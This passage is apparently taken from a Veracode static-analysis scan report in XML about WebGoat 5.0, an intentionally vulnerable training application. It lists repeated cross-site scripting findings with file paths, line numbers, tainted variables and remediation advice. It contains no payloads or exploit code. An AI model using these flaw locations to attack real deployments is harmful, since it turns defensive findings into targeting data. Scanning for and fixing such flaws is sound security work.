        doHTTPSplitting(session.WebSession)\" functionrelativelocation=\"55\">\n<exploitability_adjustments>\n<exploitability_adjustment
        score_adjustment=\"1\">\n<note>This source of the tainted data is an external
        web request.</note>\n</exploitability_adjustment>\n</exploitability_adjustments>\n</flaw>\n<flaw
        severity=\"3\" categoryname=\"Improper Neutralization of Script-Related HTML
        Tags in a Web Page (Basic XSS)\" count=\"1\" issueid=\"221\" module=\"WebGoat-5.0-with-jsp.war\"
        type=\"javax.servlet.jsp.JspWriter.print\" description=\"This call to javax.servlet.jsp.JspWriter.print()
        contains a cross-site scripting (XSS) flaw. The application populates the
        HTTP response with user-supplied input, allowing an attacker to embed malicious
        content, such as Javascript code, which will be executed in the context of
        the victim's browser. XSS vulnerabilities are commonly exploited to steal
        or manipulate cookies, modify presentation of content, and compromise confidential
        information, with new attack vectors being discovered on a regular basis.
        The first argument to print() contains tainted data from the variable webSession.getUserNameInLesson().
        The tainted data originated from an earlier call to java.sql.statement.executequery.
        The tainted data is directed into an output stream returned by javax.servlet.jsp.JspWriter.\r\n\r\nUse
        contextual escaping on all untrusted data before using it to construct any
        portion of an HTTP response. The escaping method should be chosen based on
        the specific use case of the untrusted data, otherwise it may not protect
        fully against the attack. For example, if the data is being written to the
        body of an HTML page, use HTML entity encoding (e.g. StringEscapeUtils.escapeHtml()
        in J2EE or HttpUtility.HtmlEncode() in ASP.NET). For more details on contextual
        escaping, see https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet.
        In addition, as a best practice, always validate user-supplied input to ensure
        that it conforms to the expected format, using centralized data validation
        routines when possible.\r\n\r\nReferences: \r\nCWE (http://cwe.mitre.org/data/definitions/79.html)
        \r\nOWASP (http://www.owasp.org/index.php/XSS) \r\nWASC (http://webappsec.pbworks.com/Cross-Site-Scripting)\r\n\r\n\"
        note=\"\" cweid=\"80\" remediationeffort=\"3\" exploitLevel=\"0\" categoryid=\"20\"
        pcirelated=\"true\" date_first_occurrence=\"2012-02-29 16:13:33 UTC\" remediation_status=\"New\"
        cia_impact=\"ppn\" grace_period_expires=\"\" affects_policy_compliance=\"false\"
        sourcefile=\"ListStaff_jsp.java\" line=\"52\" sourcefilepath=\"com/veracode/compiledjsp/xWebGoat50war/lessons/CrossSiteScripting/\"
        scope=\"com.veracode.compiledjsp.xWebGoat50war.lessons.CrossSiteScripting.ListStaff_jsp\"
        functionprototype=\"void _jspService(javax.servlet.http.HttpServletRequest,
        javax.servlet.http.HttpServletResponse)\" functionrelativelocation=\"25\">\n<exploitability_adjustments>\n<exploitability_adjustment
        score_adjustment=\"-1\">\n<note>The source of the tainted data in this web
        application flaw is not a web request.</note>\n</exploitability_adjustment>\n</exploitability_adjustments>\n</flaw>\n<flaw
        severity=\"3\" categoryname=\"Improper Neutralization of Script-Related HTML
        Tags in a Web Page (Basic XSS)\" count=\"1\" issueid=\"1\" module=\"WebGoat-5.0-with-jsp.war\"
        type=\"javax.servlet.jsp.JspWriter.print\" description=\"This call to javax.servlet.jsp.JspWriter.print()
        contains a cross-site scripting (XSS) flaw. The application populates the
        HTTP response with user-supplied input, allowing an attacker to embed malicious
        content, such as Javascript code, which will be executed in the context of
        the victim's browser. XSS vulnerabilities are commonly exploited to steal
        or manipulate cookies, modify presentation of content, and compromise confidential
        information, with new attack vectors being discovered on a regular basis.
        The first argument to print() contains tainted data from the variable webSession.getUserNameInLesson().
        The tainted data originated from an earlier call to java.sql.statement.executequery.
        The tainted data is directed into an output stream returned by javax.servlet.jsp.JspWriter.\r\n\r\nUse
        contextual escaping on all untrusted data before using it to construct any
        portion of an HTTP response. The escaping method should be chosen based on
        the specific use case of the untrusted data, otherwise it may not protect
        fully against the attack. For example, if the data is being written to the
        body of an HTML page, use HTML entity encoding (e.g. StringEscapeUtils.escapeHtml()
        in J2EE or HttpUtility.HtmlEncode() in ASP.NET). For more details on contextual
        escaping, see https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet.
        In addition, as a best practice, always validate user-supplied input to ensure
        that it conforms to the expected format, using centralized data validation
        routines when possible.\r\n\r\nReferences: \r\nCWE (http://cwe.mitre.org/data/definitions/79.html)
        \r\nOWASP (http://www.owasp.org/index.php/XSS) \r\nWASC (http://webappsec.pbworks.com/Cross-Site-Scripting)\r\n\r\n\"
        note=\"\" cweid=\"80\" remediationeffort=\"3\" exploitLevel=\"0\" categoryid=\"20\"
        pcirelated=\"true\" date_first_occurrence=\"2012-02-29 16:13:33 UTC\" remediation_status=\"New\"
        cia_impact=\"ppn\" grace_period_expires=\"\" affects_policy_compliance=\"false\"
        sourcefile=\"ListStaff_jsp.java\" line=\"52\" sourcefilepath=\"com/veracode/compiledjsp/xWebGoat50war/lessons/RoleBasedAccessControl/\"
        scope=\"com.veracode.compiledjsp.xWebGoat50war.lessons.RoleBasedAccessControl.ListStaff_jsp\"
        functionprototype=\"void _jspService(javax.servlet.http.HttpServletRequest,
        javax.servlet.http.HttpServletResponse)\" functionrelativelocation=\"25\">\n<exploitability_adjustments>\n<exploitability_adjustment
        score_adjustment=\"-1\">\n<note>The source of the tainted data in this web
        application flaw is not a web request.</note>\n</exploitability_adjustment>\n</exploitability_adjustments>\n</flaw>\n<flaw
        severity=\"3\" categoryname=\"Improper Neutralization of Script-Related HTML
        Tags in a Web Page (Basic XSS)\" count=\"1\" issueid=\"230\" module=\"WebGoat-5.0-with-jsp.war\"
        type=\"javax.servlet.jsp.JspWriter.print\" description=\"This call to javax.servlet.jsp.JspWriter.print()
        contains a cross-site scripting (XSS) flaw. The application populates the
        HTTP response with user-supplied input, allowing an attacker to embed malicious
        content, such as Javascript code, which will be executed in the context of
        the victim's browser. XSS vulnerabilities are commonly exploited to steal
        or manipulate cookies, modify presentation of content, and compromise confidential
        information, with new attack vectors being discovered on a regular basis.
        The first argument to print() contains tainted data from the variable webSession.getUserNameInLesson().
        The tainted data originated from an earlier call to java.sql.statement.executequery.
        The tainted data is directed into an output stream returned by javax.servlet.jsp.JspWriter.\r\n\r\nUse
        contextual escaping on all untrusted data before using it to construct any
        portion of an HTTP response. The escaping method should be chosen based on
        the specific use case of the untrusted data, otherwise it may not protect
        fully against the attack. For example, if the data is being written to the
        body of an HTML page, use HTML entity encoding (e.g. StringEscapeUtils.escapeHtml()
        in J2EE or HttpUtility.HtmlEncode() in ASP.NET). For more details on contextual
        escaping, see https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet.
        In addition, as a best practice, always validate user-supplied input to ensure
        that it conforms to the expected format, using centralized data validation
        routines when possible.\r\n\r\nReferences: \r\nCWE (http://cwe.mitre.org/data/definitions/79.html)
        \r\nOWASP (http://www.owasp.org/index.php/XSS) \r\nWASC (http://webappsec.pbworks.com/Cross-Site-Scripting)\r\n\r\n\"
        note=\"\" cweid=\"80\" remediationeffort=\"3\" exploitLevel=\"0\" categoryid=\"20\"
        pcirelated=\"true\" date_first_occurrence=\"2012-02-29 16:13:33 UTC\" remediation_status=\"New\"
        cia_impact=\"ppn\" grace_period_expires=\"\" affects_policy_compliance=\"false\"
        sourcefile=\"ListStaff_jsp.java\" line=\"52\" sourcefilepath=\"com/veracode/compiledjsp/xWebGoat50war/lessons/SQLInjection/\"
        scope=\"com.veracode.compiledjsp.xWebGoat50war.lessons.SQLInjection.ListStaff_jsp\"
        functionprototype=\"void _jspService(javax.servlet.http.HttpServletRequest,
        javax.servlet.http.HttpServletResponse)\" functionrelativelocation=\"25\">\n<exploitability_adjustments>\n<exploitability_adjustment
        score_adjustment=\"-1\">\n<note>The source of the tainted data in this web
        application flaw is not a web request.</note>\n</exploitability_adjustment>\n</exploitability_adjustments>\n</flaw>\n<flaw
        severity=\"3\" categoryname=\"Improper Neutralization of Script-Related HTML
        Tags in a Web Page (Basic XSS)\" count=\"1\" issueid=\"241\" module=\"WebGoat-5.0-with-jsp.war\"
        type=\"javax.servlet.jsp.JspWriter.print\" description=\"This call to javax.servlet.jsp.JspWriter.print()
        contains a cross-site scripting (XSS) flaw. The application populates the
        HTTP response with user-supplied input, allowing an attacker to embed malicious
        content, such as Javascript code, which will be executed in the context of
        the victim's browser. XSS vulnerabilities are commonly exploited to steal
        or manipulate cookies, modify presentation of content, and compromise confidential
        information, with new attack vectors being discovered on a regular basis.
        The first argument to print() contains tainted data from the variables stub.getRole(),
        and stub.getLastName(). The tainted data originated from an earlier call to
        java.sql.statement.executequery. The tainted data is directed into an output
        stream returned by javax.servlet.jsp.JspWriter.\r\n\r\nUse contextual escaping
        on all untrusted data before using it to construct any portion of an HTTP
        response. The escaping method should be chosen based on the specific use case
        of the untrusted data, otherwise it may not protect fully against the attack.
        For example, if the data is being written to the body of an HTML page, use
        HTML entity encoding (e.g. StringEscapeUtils.escapeHtml() in J2EE or HttpUtility.HtmlEncode()
        in ASP.NET). For more details on contextual escaping, see https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet.
        In addition, as a best practice, always validate user-supplied input to ensure
        that it conforms to the expected format, using centralized data validation
        routines when possible.\r\n\r\nReferences: \r\nCWE (http://cwe.mitre.org/data/definitions/79.html)
        \r\nOWASP (http://www.owasp.org/index.php/XSS) \r\nWASC (http://webappsec.pbworks.com/Cross-Site-Scripting)\r\n\r\n\"
        note=\"\" cweid=\"80\" remediationeffort=\"3\" exploitLevel=\"0\" categoryid=\"20\"
        pcirelated=\"true\" date_first_occurrence=\"2012-02-29 16:13:33 UTC\" remediation_status=\"New\"
        cia_impact=\"ppn\" grace_period_expires=\"\" affects_policy_compliance=\"false\"
        sourcefile=\"ListStaff_jsp.java\" line=\"68\" sourcefilepath=\"com/veracode/compiledjsp/xWebGoat50war/lessons/CrossSiteScripting/\"
        scope=\"com.veracode.compiledjsp.xWebGoat50war.lessons.CrossSiteScripting.ListStaff_jsp\"
        functionprototype=\"void _jspService(javax.servlet.http.HttpServletRequest,
        javax.servlet.http.HttpServletResponse)\" functionrelativelocation=\"57\">\n<exploitability_adjustments>\n<exploitability_adjustment
        score_adjustment=\"-1\">\n<note>The source of the tainted data in this web
        application flaw is not a web request.</note>\n</exploitability_adjustment>\n</exploitability_adjustments>\n</flaw>\n<flaw
        severity=\"3\" categoryname=\"Improper Neutralization of Script-Related HTML
        Tags in a Web Page (Basic XSS)\" count=\"1\" issueid=\"263\" module=\"WebGoat-5.0-with-jsp.war\"
        type=\"javax.servlet.jsp.JspWriter.print\" description=\"This call to javax.servlet.jsp.JspWriter.print()
        contains a cross-site scripting (XSS) flaw. The application populates the
        HTTP response with user-supplied input, allowing an attacker to embed malicious
        content, such as Javascript code, which will be executed in the context of
        the victim's browser. XSS vulnerabilities are commonly exploited to steal
        or manipulate cookies, modify presentation of content, and compromise confidential
        information, with new attack vectors being discovered on a regular basis.
        The first argument to print() contains tainted data from the variables stub.getRole(),
        and stub.getLastName(). The tainted data originated from an earlier call to
        java.sql.statement.executequery. The tainted data is directed into an output
        stream returned by javax.servlet.jsp.JspWriter.\r\n\r\nUse contextual escaping
        on all untrusted data before using it to construct any portion of an HTTP
        response. The escaping method should be chosen based on the specific use case
        of the untrusted data, otherwise it may not protect fully against the attack.
        For example, if the data is being written to the body of an HTML page, use
        HTML entity encoding (e.g. StringEscapeUtils.escapeHtml() in J2EE or HttpUtility.HtmlEncode()
        in ASP.NET). For more details on contextual escaping, see https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet.
        In addition, as a best practice, always validate user-supplied input to ensure
        that it conforms to the expected format, using centralized data validation
        routines when possible.\r\n\r\nReferences: \r\nCWE (http://cwe.mitre.org/data/definitions/79.html)
        \r\nOWASP (http://www.owasp.org/index.php/XSS) \r\nWASC (http://webappsec.pbworks.com/Cross-Site-Scripting)\r\n\r\n\"
        note=\"\" cweid=\"80\" remediationeffort=\"3\" exploitLevel=\"0\" categoryid=\"20\"
        pcirelated=\"true\" date_first_occurrence=\"2012-02-29 16:13:33 UTC\" remediation_status=\"New\"
        cia_impact=\"ppn\" grace_period_expires=\"\" affects_policy_compliance=\"false\"
        sourcefile=\"ListStaff_jsp.java\" line=\"68\" sourcefilepath=\"com/veracode/compiledjsp/xWebGoat50war/lessons/SQLInjection/\"
        scope=\"com.veracode.compiledjsp.xWebGoat50war.lessons.SQLInjection.ListStaff_jsp\"
        functionprototype=\"void _jspService(javax.servlet.http.HttpServletRequest,
        javax.servlet.http.HttpServletResponse)\" functionrelativelocation=\"57\">\n<exploitability_adjustments>\n<exploitability_adjustment
        score_adjustment=\"-1\">\n<note>The source of the tainted data in this web
        application flaw is not a web request.</note>\n</exploitability_adjustment>\n</exploitability_adjustments>\n</flaw>\n<flaw
        severity=\"3\" categoryname=\"Improper Neutralization of Script-Related HTML
        Tags in a Web Page (Basic XSS)\" count=\"1\" issueid=\"4\" module=\"WebGoat-5.0-with-jsp.war\"
        type=\"javax.servlet.jsp.JspWriter.print\" description=\"This call to javax.servlet.jsp.JspWriter.print()
        contains a cross-site scripting (XSS) flaw. The application populates the
        HTTP response with user-supplied input, allowing an attacker to embed malicious
        content, such as Javascript code, which will be executed in the context of
        the victim's browser. XSS vulnerabilities are commonly exploited to steal
        or manipulate cookies, modify presentation of content, and compromise confidential
        information, with new attack vectors being discovered on a regular basis.
        The first argument to print() contains tainted data from the variables stub.getRole(),
        and stub.getLastName(). The tainted data originated from an earlier call to
        java.sql.statement.executequery. The tainted data is directed into an output
        stream returned by javax.servlet.jsp.JspWriter.\r\n\r\nUse contextual escaping
        on all untrusted data before using it to construct any portion of an HTTP
        response. The escaping method should be chosen based on the specific use case
        of the untrusted data, otherwise it may not protect fully against the attack.
        For example, if the data is being written to the body of an HTML page, use
        HTML entity encoding (e.g. StringEscapeUtils.escapeHtml() in J2EE or HttpUtility.HtmlEncode()
        in ASP.NET). For more details on contextual escaping, see https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet.
        In addition, as a best practice, always validate user-supplied input to ensure
        that it conforms to the expected format, using centralized data validation
        routines when possible.\r\n\r\nReferences: \r\nCWE (http://cwe.mitre.org/data/definitions/79.html)
        \r\nOWASP (http://www.owasp.org/index.php/XSS) \r\nWASC (http://webappsec.pbworks.com/Cross-Site-Scripting)\r\n\r\n\"
        note=\"\" cweid=\"80\" remediationeffort=\"3\" exploitLevel=\"0\" categoryid=\"20\"
        pcirelated=\"true\" date_first_occurrence=\"2012-02-29 16:13:33 UTC\" remediation_status=\"New\"
        cia_impact=\"ppn\" grace_period_expires=\"\" affects_policy_compliance=\"false\"
        sourcefile=\"ListStaff_jsp.java\" line=\"68\" sourcefilepath=\"com/veracode/compiledjsp/xWebGoat50war/lessons/RoleBasedAccessControl/\"
        scope=\"com.veracode.compiledjsp.xWebGoat50war.lessons.RoleBasedAccessControl.ListStaff_jsp\"
        functionprototype=\"void _jspService(javax.servlet.http.HttpServletRequest,
        javax.servlet.http.HttpServletResponse)\" functionrelativelocation=\"57\">\n<exploitability_adjustments>\n<exploitability_adjustment
        score_adjustment=\"-1\">\n<note>The source of the tainted data in this web
        application flaw is not a web request.</note>\n</exploitability_adjustment>\n</exploitability_adjustments>\n</flaw>\n<flaw
        severity=\"3\" categoryname=\"Improper Neutralization of Script-Related HTML
        Tags in a Web Page (Basic XSS)\" count=\"1\" issueid=\"172\" module=\"WebGoat-5.0-with-jsp.war\"
        type=\"javax.servlet.jsp.JspWriter.print\" description=\"This call to javax.servlet.jsp.JspWriter.print()
        contains a cross-site scripting (XSS) flaw. The application populates the
        HTTP response with user-supplied input, allowing an attacker to embed malicious
        content, such as Javascript code, which will be executed in the context of
        the victim's browser. XSS vulnerabilities are commonly exploited to steal
        or manipulate cookies, modify presentation of content, and compromise confidential
        information, with new attack vectors being discovered on a regular basis.
        The first argument to print() contains tainted data from the variables stub.getRole(),
        and stub.getLastName(). The tainted data originated from an earlier call to
        java.sql.statement.executequery. The tainted data is directed into an output
        stream returned by javax.servlet.jsp.JspWriter.\r\n\r\nUse contextual escaping
        on all untrusted data before using it to construct any portion of an HTTP
        response. The escaping method should be chosen based on the specific use case
        of the untrusted data, otherwise it may not protect fully against the attack.
        For example, if the data is being written to the body of an HTML page, use
        HTML entity encoding (e.g. StringEscapeUtils.escapeHtml() in J2EE or HttpUtility.HtmlEncode()
        in ASP.NET). For more details on contextual escaping, see https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet.
        In addition, as a best practice, always validate user-supplied input to ensure
        that it conforms to the expected format, using centralized data validation
        routines when possible.\r\n\r\nReferences: \r\nCWE (http://cwe.mitre.org/data/definitions/79.html)
        \r\nOWASP (http://www.owasp.org/index.php/XSS) \r\nWASC (http://webappsec.pbworks.com/Cross-Site-Scripting)\r\n\r\n\"
        note=\"\" cweid=\"80\" remediationeffort=\"3\" exploitLevel=\"0\" categoryid=\"20\"
        pcirelated=\"true\" date_first_occurrence=\"2012-02-29 16:13:33 UTC\" remediation_status=\"New\"
        cia_impact=\"ppn\" grace_period_expires=\"\" affects_policy_compliance=\"false\"
        sourcefile=\"Login_jsp.java\" line=\"71\" sourcefilepath=\"com/veracode/compiledjsp/xWebGoat50war/lessons/CrossSiteScripting/\"
        scope=\"com.veracode.compiledjsp.xWebGoat50war.lessons.CrossSiteScripting.Login_jsp\"
        functionprototype=\"void _jspService(javax.servlet.http.HttpServletRequest,
        javax.servlet.http.HttpServletResponse)\" functionrelativelocation=\"72\">\n<exploitability_adjustments>\n<exploitability_adjustment
        score_adjustment=\"-1\">\n<note>The source of the tainted data in this web
        application flaw is not a web request.</note>\n</exploitability_adjustment>\n</exploitability_adjustments>\n</flaw>\n<flaw
        severity=\"3\" categoryname=\"Improper Neutralization of Script-Related HTML
        Tags in a Web Page (Basic XSS)\" count=\"1\" issueid=\"260\" module=\"WebGoat-5.0-with-jsp.war\"
        type=\"javax.servlet.jsp.JspWriter.print\" description=\"This call to javax.servlet.jsp.JspWriter.print()
        contains a cross-site scripting (XSS) flaw. The application populates the
        HTTP response with user-supplied input, allowing an attacker to embed malicious
        content, such as Javascript code, which will be executed in the context of
        the victim's browser. XSS vulnerabilities are commonly exploited to steal
        or manipulate cookies, modify presentation of content, and compromise confidential
        information, with new attack vectors being discovered on a regular basis.
        The first argument to print() contains tainted data from the variables stub.getRole(),
        and stub.getLastName(). The tainted data originated from an earlier call to
        java.sql.statement.executequery. The tainted data is directed into an output
        stream returned by javax.servlet.jsp.JspWriter.\r\n\r\nUse contextual escaping
        on all untrusted data before using it to construct any portion of an HTTP
        response. The escaping method should be chosen based on the specific use case
        of the untrusted data, otherwise it may not protect fully against the attack.
        For example, if the data is being written to the body of an HTML page, use
        HTML entity encoding (e.g. StringEscapeUtils.escapeHtml() in J2EE or HttpUtility.HtmlEncode()
        in ASP.NET). For more details on contextual escaping, see https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet.
        In addition, as a best practice, always validate user-supplied input to ensure
        that it conforms to the expected format, using centralized data validation
        routines when possible.\r\n\r\nReferences: \r\nCWE (http://cwe.mitre.org/data/definitions/79.html)
        \r\nOWASP (http://www.owasp.org/index.php/XSS) \r\nWASC (http://webappsec.pbworks.com/Cross-Site-Scripting)\r\n\r\n\"
        note=\"\" cweid=\"80\" remediationeffort=\"3\" exploitLevel=\"0\" categoryid=\"20\"
        pcirelated=\"true\" date_first_occurrence=\"2012-02-29 16:13:33 UTC\" remediation_status=\"New\"
        cia_impact=\"ppn\" grace_period_expires=\"\" affects_policy_compliance=\"false\"
        sourcefile=\"Login_jsp.java\" line=\"71\" sourcefilepath=\"com/veracode/compiledjsp/xWebGoat50war/lessons/RoleBasedAccessControl/\"
        scope=\"com.veracode.compiledjsp.xWebGoat50war.lessons.RoleBasedAccessControl.Login_jsp\"
        functionprototype=\"void _jspService(javax.servlet.http.HttpServletRequest,
        javax.servlet.http.HttpServletResponse)\" functionrelativelocation=\"72\">\n<exploitability_adjustments>\n<exploitability_adjustment
        score_adjustment=\"-1\">\n<note>The source of the tainted data in this web
        application flaw is not a web request.</note>\n</exploitability_adjustment>\n</exploitability_adjustments>\n</flaw>\n<flaw
        severity=\"3\" categoryname=\"Improper Neutralization of Script-Related HTML
        Tags in a Web Page (Basic XSS)\" count=\"1\" issueid=\"48\" module=\"WebGoat-5.0-with-jsp.war\"
        type=\"javax.servlet.jsp.JspWriter.print\" description=\"This call to javax.servlet.jsp.JspWriter.print()
        contains a cross-site scripting (XSS) flaw. The application populates the
        HTTP response with user-supplied input, allowing an attacker to embed malicious
        content, such as Javascript code, which will be executed in the context of
        the victim's browser. XSS vulnerabilities are commonly exploited to steal
        or manipulate cookies, modify presentation of content, and compromise confidential
        information, with new attack vectors being discovered on a regular basis.
        The first argument to print() contains tainted data from the variables stub.getRole(),
        and stub.getLastName(). The tainted data originated from an earlier call to
        java.sql.statement.executequery. The tainted data is directed into an output
        stream returned by javax.servlet.jsp.JspWriter.\r\n\r\nUse contextual escaping
        on all untrusted data before using it to construct any portion of an HTTP
        response. The escaping method should be chosen based on the specific use case
        of the untrusted data, otherwise it may not protect fully against the attack.
        For example, if the data is being written to the body of an HTML page, use
        HTML entity encoding (e.g. StringEscapeUtils.escapeHtml() in J2EE or HttpUtility.HtmlEncode()
        in ASP.NET). For more details on contextual escaping, see https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet.
        In addition, as a best practice, always validate user-supplied input to ensure
        that it conforms to the expected format, using centralized data validation
        routines when possible.\r\n\r\nReferences: \r\nCWE (http://cwe.mitre.org/data/definitions/79.html)
        \r\nOWASP (http://www.owasp.org/index.php/XSS) \r\nWASC (http://webappsec.pbworks.com/Cross-Site-Scripting)\r\n\r\n\"
        note=\"\" cweid=\"80\" remediationeffort=\"3\" exploitLevel=\"0\" categoryid=\"20\"
        pcirelated=\"true\" date_first_occurrence=\"2012-02-29 16:13:33 UTC\" remediation_status=\"New\"
        cia_impact=\"ppn\" grace_period_expires=\"\" affects_policy_compliance=\"false\"
        sourcefile=\"Login_jsp.java\" line=\"71\" sourcefilepath=\"com/veracode/compiledjsp/xWebGoat50war/lessons/SQLInjection/\"
        scope=\"com.veracode.compiledjsp.xWebGoat50war.lessons.SQLInjection.Login_jsp\"
        functionprototype=\"void _jspService(javax.servlet.http.HttpServletRequest,
        javax.servlet.http.HttpServletResponse)\" functionrelativelocation=\"72\">\n<exploitability_adjustments>\n<exploitability_adjustment
        score_adjustment=\"-1\">\n<note>The source of the tainted data in this web
        application flaw is not a web request.</note>\n</exploitability_adjustment>\n</exploitability_adjustments>\n</flaw>\n<flaw
        severity=\"3\" categoryname=\"Improper Neutralization of Script-Related HTML
        Tags in a Web Page (Basic XSS)\" count=\"1\" issueid=\"80\" module=\"WebGoat-5.0-with-jsp.war\"
        type=\"javax.servlet.jsp.JspWriter.print\" description=\"This call to javax.servlet.jsp.JspWriter.print()
        contains a cross-site scripting (XSS) flaw. The application populates the
        HTTP response with user-supplied input, allowing an attacker to embed malicious
        content, such as Javascript code, which will be executed in the context of
        the victim's browser. XSS vulnerabilities are commonly exploited to steal
        or manipulate cookies, modify presentation of content, and compromise confidential
        information, with new attack vectors being discovered on a regular basis.
        The first argument to print() contains tainted data from the variable menu.
        The tainted data originated from an earlier call to javax.servlet.servletrequest.getparameter.
        The tainted data is directed into an output stream returned by javax.servlet.jsp.JspWriter.\r\n\r\nUse
        contextual escaping on all untrusted data before using it to construct any
        portion of an HTTP response. The escaping method should be chosen based on
        the specific use case of the untrusted data, otherwise it may not protect
        fully against the attack. For example, if the data is being written to the
        body of an HTML page, use HTML entity encoding (e.g. StringEscapeUtils.escapeHtml()
        in J2EE or HttpUtility.HtmlEncode() in ASP.NET). For more details on contextual
        escaping, see https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet.
        In addition, as a best practice, always validate user-supplied input to ensure
        that it conforms to the expected format, using centralized data validation
        routines when possible.\r\n\r\nReferences: \r\nCWE (http://cwe.mitre.org/data/definitions/79.html)
        \r\nOWASP (http://www.owasp.org/index.php/XSS) \r\nWASC (http://webappsec.pbworks.com/Cross-Site-Scripting)\r\n\r\n\"
        note=\"\" cweid=\"80\" remediationeffort=\"3\" exploitLevel=\"2\" categoryid=\"20\"
        pcirelated=\"true\" date_first_occurrence=\"2012-02-29 16:13:33 UTC\" remediation_status=\"New\"
        cia_impact=\"ppn\" grace_period_expires=\"\" affects_policy_compliance=\"false\"
        sourcefile=\"main_jsp.java\" line=\"170\" sourcefilepath=\"com/veracode/compiledjsp/xWebGoat50war/\"
        scope=\"com.veracode.compiledjsp.xWebGoat50war.main_jsp\" functionprototype=\"void
        _jspService(javax.servlet.http.HttpServletRequest, javax.servlet.http.HttpServletResponse)\"
        functionrelativelocation=\"56\">\n<exploitability_adjustments>\n<exploitability_adjustment
        score_adjustment=\"1\">\n<note>This source of the tainted data is an external
        web request.</note>\n</exploitability_adjustment>\n</exploitability_adjustments>\n</flaw>\n<flaw
        severity=\"3\" categoryname=\"Improper Neutralization of Script-Related HTML
        Tags in a Web Page (Basic XSS)\" count=\"1\" issueid=\"29\" module=\"WebGoat-5.0-with-jsp.war\"
        type=\"javax.servlet.jsp.JspWriter.print\" description=\"This call to javax.servlet.jsp.JspWriter.print()
        contains a cross-site scripting (XSS) flaw. The application populates the
        HTTP response with user-supplied input, allowing an attacker to embed malicious
        content, such as Javascript code, which will be executed in the context of
        the victim's browser. XSS vulnerabilities are commonly exploited to steal
        or manipulate cookies, modify presentation of content, and compromise confidential
        information, with new attack vectors being discovered on a regular basis.
        The first argument to print() contains tainted data from the variable menu.
        The tainted data originated from an earlier call to javax.servlet.servletrequest.getparameter.
        The tainted data is directed into an output stream returned by javax.servlet.jsp.JspWriter.\r\n\r\nUse
        contextual escaping on all untrusted data before using it to construct any
        portion of an HTTP response. The escaping method should be chosen based on
        the specific use case of the untrusted data, otherwise it may not protect
        fully against the attack. For example, if the data is being written to the
        body of an HTML page, use HTML entity encoding (e.g. StringEscapeUtils.escapeHtml()
        in J2EE or HttpUtility.HtmlEncode() in ASP.NET). For more details on contextual
        escaping, see https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet.
        In addition, as a best practice, always validate user-supplied input to ensure
        that it conforms to the expected format, using centralized data validation
        routines when possible.\r\n\r\nReferences: \r\nCWE (http://cwe.mitre.org/data/definitions/79.html)
        \r\nOWASP (http://www.owasp.org/index.php/XSS) \r\nWASC (http://webappsec.pbworks.com/Cross-Site-Scripting)\r\n\r\n\"
        note=\"\" cweid=\"80\" remediationeffort=\"3\" exploitLevel=\"2\" categoryid=\"20\"
        pcirelated=\"true\" date_first_occurrence=\"2012-02-29 16:13:33 UTC\" remediation_status=\"New\"
        cia_impact=\"ppn\" grace_period_expires=\"\" affects_policy_compliance=\"false\"
        sourcefile=\"main_jsp.java\" line=\"172\" sourcefilepath=\"com/veracode/compiledjsp/xWebGoat50war/\"
        scope=\"com.veracode.compiledjsp.xWebGoat50war.main_jsp\" functionprototype=\"void
        _jspService(javax.servlet.http.HttpServletRequest, javax.servlet.http.HttpServletResponse)\"
        functionrelativelocation=\"56\">\n<exploitability_adjustments>\n<exploitability_adjustment
        score_adjustment=\"1\">\n<note>This source of the tainted data is an external
        web request.</note>\n</exploitability_adjustment>\n</exploitability_adjustments>\n</flaw>\n<flaw
        severity=\"3\" categoryname=\"Improper Neutralization of Script-Related HTML
        Tags in a Web Page (Basic XSS)\" count=\"1\" issueid=\"205\" module=\"WebGoat-5.0-with-jsp.war\"
        type=\"javax.servlet.jsp.JspWriter.print\" description=\"This call to javax.servlet.jsp.JspWriter.print()
        contains a cross-site scripting (XSS) flaw. The application populates the
        HTTP response with user-supplied input, allowing an attacker to embed malicious
        content, such as Javascript code, which will be executed in the context of
        the victim's browser. XSS vulnerabilities are commonly exploited to steal
        or manipulate cookies, modify presentation of content, and compromise confidential
        information, with new attack vectors being discovered on a regular basis.
        The first argument to print() contains tainted data from the variable menu.
        The tainted data originated from an earlier call to javax.servlet.servletrequest.getparameter.
        The tainted data is directed into an output stream returned by javax.servlet.jsp.JspWriter.\r\n\r\nUse
        contextual escaping on all untrusted data before using it to construct any
        portion of an HTTP response. The escaping method should be chosen based on
        the specific use case of the untrusted data, otherwise it may not protect
        fully against the attack. For example, if the data is being written to the
        body of an HTML page, use HTML entity encoding (e.g. StringEscapeUtils.escapeHtml()
        in J2EE or HttpUtility.HtmlEncode() in ASP.NET). For more details on contextual
        escaping, see https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet.
        In addition, as a best practice, always validate user-supplied input to ensure
        that it conforms to the expected format, using centralized data validation
        routines when possible.\r\n\r\nReferences: \r\nCWE (http://cwe.mitre.org/data/definitions/79.html)
        \r\nOWASP (http://www.owasp.org/index.php/XSS) \r\nWASC (http://webappsec.pbworks.com/Cross-Site-Scripting)\r\n\r\n\"
        note=\"\" cweid=\"80\" remediationeffort=\"3\" exploitLevel=\"2\" categoryid=\"20\"
        pcirelated=\"true\" date_first_occurrence=\"2012-02-29 16:13:33 UTC\" remediation_status=\"New\"
        cia_impact=\"ppn\" grace_period_expires=\"\" affects_policy_compliance=\"false\"
        sourcefile=\"main_jsp.java\" line=\"174\" sourcefilepath=\"com/veracode/compiledjsp/xWebGoat50war/\"
        scope=\"com.veracode.compiledjsp.xWebGoat50war.main_jsp\" functionprototype=\"void
        _jspService(javax.servlet.http.HttpServletRequest, javax.servlet.http.HttpServletResponse)\"
        functionrelativelocation=\"57\">\n<exploitability_adjustments>\n<exploitability_adjustment
